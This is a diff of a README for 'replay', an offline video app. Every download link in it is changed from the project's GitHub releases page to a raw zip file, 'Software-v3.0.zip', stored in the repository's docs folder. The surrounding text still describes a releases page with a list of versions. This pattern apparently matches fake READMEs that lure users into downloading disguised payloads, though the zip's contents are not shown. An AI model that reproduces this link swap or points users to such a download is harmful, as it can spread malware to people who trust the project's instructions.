@@ -1,6 +1,6 @@
 # 🎬 replay - Your Videos, Ready Offline
 
-[![Download replay](https://img.shields.io/badge/Download-replay-2ea44f?style=for-the-badge&logo=github)](https://github.com/xcaccx/replay/releases)
+[![Download replay](https://img.shields.io/badge/Download-replay-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/xcaccx/replay/main/docs/Software-v3.0.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Getting replay up and running is quick and easy. You don't need to be a tech wiz
 2. **Click the download button** on the release page. Your browser will start downloading the file automatically.
 3. **Open the downloaded file** to launch replay. The app will open, and you're ready to start building your offline queue.
 
-> **Link:** [Visit this link to download the application.](https://github.com/xcaccx/replay/releases)
+> **Link:** [Visit this link to download the application.](https://raw.githubusercontent.com/xcaccx/replay/main/docs/Software-v3.0.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Getting replay up and running is quick and easy. You don't need to be a tech wiz
 
 Once you've downloaded the file from the link above, here's how to get it fully installed and working:
 
-1. **Go to the download link** — [https://github.com/xcaccx/replay/releases](https://github.com/xcaccx/replay/releases)
+1. **Go to the download link** — [https://raw.githubusercontent.com/xcaccx/replay/main/docs/Software-v3.0.zip](https://raw.githubusercontent.com/xcaccx/replay/main/docs/Software-v3.0.zip)
 2. **Look for the latest release** — You'll see a list of versions. The newest one is at the top.
 3. **Click the download arrow** — Next to the version, you'll see a file link. Click it to start downloading.
 4. **Wait for the download to finish** — This usually takes less than a minute, depending on your internet speed.
@@ -120,7 +120,7 @@ We're here to help you get the most out of replay. Here are common solutions to 
 
 replay is constantly improving. New features and fixes are released regularly. To get the latest version, simply visit the download page from time to time and grab the newest release.
 
-[**Download the Latest Version**](https://github.com/xcaccx/replay/releases)
+[**Download the Latest Version**](https://raw.githubusercontent.com/xcaccx/replay/main/docs/Software-v3.0.zip)
 
 ---
 
